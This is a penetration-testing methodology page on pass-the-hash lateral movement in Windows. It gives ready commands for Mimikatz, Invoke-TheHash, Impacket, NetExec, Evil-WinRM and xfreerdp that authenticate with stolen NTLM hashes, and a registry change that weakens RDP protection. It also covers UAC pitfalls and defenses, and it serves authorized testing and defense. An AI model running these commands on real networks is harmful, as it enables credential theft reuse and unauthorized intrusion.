---
layout: page
title: "Pass the Hash"
subtitle: "Authenticating with an NTLM hash in place of a password over SMB, WMI, WinRM and RDP"
permalink: /methodology/lateral-movement/pass-the-hash/
---

Pass the hash (PtH) takes an NTLM hash, obtained from SAM, NTDS.dit or LSASS, and uses it to answer the NTLM challenge instead of the account password. Use it when you hold a hash for a local administrator or a domain account and need to run commands or open a session on another host. The plaintext password is never recovered.

## 1. Background

NTLM is a challenge-response protocol that Windows uses for single sign-on. The notes point out that the NTLM hashes kept on a server and on a domain controller are not salted, so a captured hash is enough to authenticate. Hashes can be taken from the SAM database, from NTDS and from LSASS memory.

## 2. Spawn a process with Mimikatz

The `sekurlsa::pth` module starts a process under a chosen identity and loads the NTLM hash into it. It needs four values: the user, the NTLM hash, the domain (or `.` for a local account) and the program to run.

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:USERNAME /rc4:NTLM_HASH /domain:DOMAIN /run:cmd.exe" exit
```

Commands typed into the new `cmd.exe` authenticate to network resources with that identity.

## 3. Use Invoke-TheHash (PowerShell)

Invoke-TheHash reaches the target over SMB (`Invoke-SMBExec`) or WMI (`Invoke-WMIExec`) through .NET TCP clients. The hash is passed into the NTLMv2 exchange, and the account must be an administrator on the target.

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target TARGET_IP -Domain DOMAIN -Username USERNAME -Hash NTLM_HASH -Command "whoami" -Verbose
Invoke-WMIExec -Target DC_IP -Domain DOMAIN -Username USERNAME -Hash NTLM_HASH -Command "hostname"
```

If `-Command` is omitted, the function checks whether the account can use WMI on the target. The notes also show a reverse-shell payload from an online generator. Keep to read-only commands unless the scope allows changes.

## 4. Use Impacket and NetExec

Impacket accepts the hash with `-hashes`, using an empty LM part.

```bash
impacket-psexec USERNAME@TARGET_IP -hashes :NTLM_HASH
impacket-wmiexec USERNAME@TARGET_IP -hashes :NTLM_HASH
impacket-smbexec USERNAME@TARGET_IP -hashes :NTLM_HASH
impacket-atexec USERNAME@TARGET_IP -hashes :NTLM_HASH
```

NetExec is useful for sweeping a range. The `-d .` option is used for local accounts, and `--local-auth` tests one local administrator hash against every host in the range.

```bash
netexec smb TARGET_SUBNET -u USERNAME -d . -H NTLM_HASH
netexec smb TARGET_SUBNET -u USERNAME -d . -H NTLM_HASH --local-auth
netexec smb TARGET_IP -u USERNAME -d . -H NTLM_HASH -x whoami
```

## 5. Use WinRM and RDP

When SMB is blocked or the account is not an administrator, WinRM is an alternative. Evil-WinRM takes the hash with `-H`.

```bash
evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH
```

RDP pass the hash needs Restricted Admin mode on the target. The notes enable it with a registry value.

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:TARGET_IP /u:USERNAME /pth:NTLM_HASH
```

To read a share as another user, run a hash-based process as that user, then open the UNC path from that process, for example `\\DC_HOST\SHARE\file.txt`.

## What to look for

| Signal | Meaning |
|---|---|
| `(Pwn3d!)` in NetExec output | The account has administrative access on that host |
| `STATUS_LOGON_FAILURE` | The hash was rejected, or the account is not allowed on that host |
| A writable `ADMIN$` share in Impacket output | A service binary can be uploaded, which is a detection point |
| WMI access reported by Invoke-TheHash without a command | The account can use WMI on the target |

Decision point: if SMB is refused, move to WinRM or WMI. If a local account fails on a host where it should be an administrator, check the UAC settings below before retrying.

## Pitfalls

- Local accounts follow UAC token filtering. With `LocalAccountTokenFilterPolicy` set to `0`, only the built-in RID-500 administrator can perform remote admin tasks, so other local administrators fail even with the correct hash.
- Setting `FilterAdministratorToken` to `1` places the RID-500 account under UAC as well, so remote pass the hash fails against it. The option is disabled by default and works even if the account has been renamed.
- Domain accounts need the domain name. Local accounts use `.` or the computer name.
- Mimikatz needs debug privilege, so run it from an elevated context.

> Enabling Restricted Admin with `DisableRestrictedAdmin` set to `0` lowers the protection on that host. Revert it when the work is complete.
{: .warning }

## Defense

- Keep the UAC remote-admin restriction in place by leaving `LocalAccountTokenFilterPolicy` at its restrictive default. Setting it to `1` removes the filter.
- Set `FilterAdministratorToken` to `1` so the built-in administrator is also subject to UAC.
- Keep Restricted Admin disabled on hosts where RDP does not need it.
- Watch for service creation and uploads to `ADMIN$`, which the Impacket execution methods produce.
